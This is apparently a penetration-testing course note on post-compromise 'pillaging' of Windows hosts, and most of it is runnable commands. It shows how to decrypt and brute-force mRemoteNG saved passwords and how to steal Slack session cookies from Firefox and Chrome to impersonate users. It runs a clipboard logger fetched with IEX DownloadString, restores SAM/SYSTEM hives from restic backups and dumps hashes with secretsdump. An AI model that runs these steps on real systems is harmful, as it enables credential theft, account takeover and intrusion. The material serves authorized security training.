# Pillaging — Windows

Pillaging = extracting valuable information from a compromised system. Targets include credentials, configs, saved sessions, IM data, backups, clipboard content, and anything that aids further access or meets assessment objectives.

---

## Data Sources to Target

- Installed applications and services
- Websites, file shares, databases
- Directory services (AD, Azure AD)
- Name servers, deployment services, Certificate Authorities
- Source code management servers
- Virtualization, messaging, monitoring/logging systems
- Backups
- History files, documents (`.doc/x`, `.xls/x`, `passwords.*`, `pass.*`)
- Web browsers, IM clients

---

## 1. Enumerating Installed Applications

```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

**Via PowerShell + Registry (more detail, includes versions):**
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
Cross-reference version numbers against known CVEs and look for credential-storing apps (mRemoteNG, TeamViewer, OpenVPN, password managers, etc.).

---

## 2. mRemoteNG Credential Extraction

mRemoteNG stores connection info and credentials in:
```
%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml
```
Passwords are AES-GCM encrypted using a master password (default hardcoded: `mR3m`).

**Find the config file:**
```powershell
ls C:\Users\<user>\AppData\Roaming\mRemoteNG
```

**Decrypt with default master password:**
https://github.com/haseebT/mRemoteNG-Decrypt
```bash
python3 mremoteng_decrypt.py -s "<Password_attribute_value>"
```

**Decrypt with known custom master password:**
```bash
python3 mremoteng_decrypt.py -s "<Password_attribute_value>" -p admin
```

**Brute-force the master password:**
```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
  echo $password
  python3 mremoteng_decrypt.py -s "<hash>" -p $password 2>/dev/null
done
```
- If cracking `Protected` attribute → success returns `Password: ThisIsProtected`
- If cracking a `Password` node directly → returns the actual plaintext password

---

## 3. IM Client Cookie Theft (Slack Example)

Useful when MFA is in place or plaintext credentials aren't available — steal session cookies to impersonate the user in cloud-based IM apps.

### Firefox Cookie Extraction
Firefox stores cookies in SQLite:
```
%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release\cookies.sqlite
```

**Copy the database:**
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

**Extract the Slack `d` cookie:**
https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py

```bash
python3 cookieextractor.py --dbpath "/home/user/cookies.sqlite" --host slack --cookie d
```

**Use the cookie:** Install the **Cookie-Editor** browser extension → navigate to `slack.com` → replace the `d` cookie value → refresh → logged in as target user.

### Chrome Cookie Extraction
Chrome encrypts cookies with DPAPI. Use **SharpChromium** via Invoke-SharpChromium:
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

**Note:** SharpChromium uses a hardcoded path. If Chrome stores cookies in `\Network\Cookies` instead of `\Cookies`, copy it first:
```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
Then re-run Invoke-SharpChromium to get JSON-formatted cookies including the decrypted `d` value.

---

## 4. Clipboard Monitoring

Password managers often use clipboard for pasting credentials — keyloggers won't catch this, but clipboard monitoring will.

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```
Run in the background and wait — captures anything copied to the clipboard (passwords, 2FA tokens, URLs, etc.).

---

## 5. Attacking Backup Servers

Backup accounts typically need local admin rights on target machines — compromising a backup system often grants access to everything it backs up.

### restic Backup Tool Example

**Identify existing repositories:**
```powershell
restic.exe -r <repo_path> snapshots
```

**List snapshots:**
```powershell
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ snapshots
```

**Restore a specific snapshot:**
```powershell
restic.exe -r E:\restic2\ restore <snapshot_ID> --target C:\Restore
```
Files restore to `C:\Restore\<original_path>`.

**Create a VSS-based backup (for locked system files):**
```powershell
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

**High-value targets within backups:**
- Windows: SAM & SYSTEM hive, `web.config` files, credential files
- Linux: `/etc/shadow`, web configs, `.ssh/` directories (SSH keys)

> If the environment variable isn't set, restic will prompt for password interactively.

---

### Walkthrough tips

Students first need to start a shared folder from Pwnbox/`PMVPN` using `impacket-smbserver`:

        shell
`sudo impacket-smbserver share ./ -smb2support`



Can use 

```
impacket-secretsdump -sam SAM -system SYSTEM local
```

to extract password hashes
## Key Takeaways

| Target | Tool/Method |
|---|---|
| Installed apps (version check) | `dir Program Files`, PowerShell + registry |
| mRemoteNG saved sessions | `mremoteng_decrypt.py` + `confCons.xml` |
| Firefox IM cookies | `cookieextractor.py` + Cookie-Editor |
| Chrome IM cookies | `Invoke-SharpChromium` |
| Clipboard content | `Invoke-ClipboardLogger` |
| Backup system data | `restic snapshots` + `restore` |

Pillaging is highly target-dependent — understand the business, know what common apps store credentials (mRemoteNG, TeamViewer, WinSCP, PuTTY, password managers), and chain findings to maximize access.